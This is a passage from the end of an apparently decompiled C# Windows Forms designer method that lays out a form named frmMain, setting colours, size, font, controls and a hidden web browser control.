      this.cBrowser.TabIndex = 13;
      this.cBrowser.Visible = false;
      this.cBrowser.WebBrowserShortcutsEnabled = false;
      this.cBrowser.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.cBrowser_DocumentCompleted);
      this.AutoScaleDimensions = new SizeF(6f, 14f);
//      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(12, 24, 32);
      this.ClientSize = new Size(982, 486);
      this.Controls.Add((Control) this.cBrowser);
      this.Controls.Add((Control) this.pBanner);
      this.Controls.Add((Control) this.groupBox3);
      this.Controls.Add((Control) this.groupBox5);
      this.Controls.Add((Control) this.label11);
      this.Controls.Add((Control) this.groupBox4);
      this.Controls.Add((Control) this.label10);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label5);
      this.Controls.Add((Control) this.groupBox2);
      this.Controls.Add((Control) this.groupBox1);
      this.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.ForeColor = Color.LightBlue;
      this.MaximizeBox = false;
      this.Name = "frmMain";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "frmMain";
      this.Load += new EventHandler(this.frmMain_Load);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.groupBox2.ResumeLayout(false);
      this.groupBox2.PerformLayout();
      this.groupBox3.ResumeLayout(false);
      this.groupBox3.PerformLayout();
      this.tbSpeed.EndInit();
      this.groupBox4.ResumeLayout(false);
      this.groupBox5.ResumeLayout(false);
      ((ISupportInitialize) this.pBanner).EndInit();
      this.ResumeLayout(false);
    }
  }
}
